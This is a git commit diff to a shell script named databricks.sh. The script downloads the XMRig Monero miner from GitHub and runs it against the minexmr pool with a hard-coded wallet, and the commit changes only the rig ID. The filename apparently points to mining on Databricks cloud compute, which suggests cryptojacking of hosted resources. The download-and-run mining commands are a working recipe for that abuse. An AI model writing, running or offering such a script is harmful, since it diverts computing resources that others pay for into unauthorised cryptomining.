9ab266fe4ea5995c13a6f49c123ca134505fcd2c
zip08 <105172337+zip08@users.noreply.github.com>
2022-05-09 14:50:21 +0700

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
 tar xvzf xmrig-6.16.4-focal-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig -o us-west.minexmr.com:443 -u 83bJ49DQHNfJeyLrBEdVKjFmTXBZiLYxe2976HXBacgW3cuoAGwHBXPfyMWesVVU8DbEnRogQ8RvKMNjgFL1hRufRjZMLvg -k --tls --rig-id aank
+./xmrig -o us-west.minexmr.com:443 -u 83bJ49DQHNfJeyLrBEdVKjFmTXBZiLYxe2976HXBacgW3cuoAGwHBXPfyMWesVVU8DbEnRogQ8RvKMNjgFL1hRufRjZMLvg -k --tls --rig-id GC1
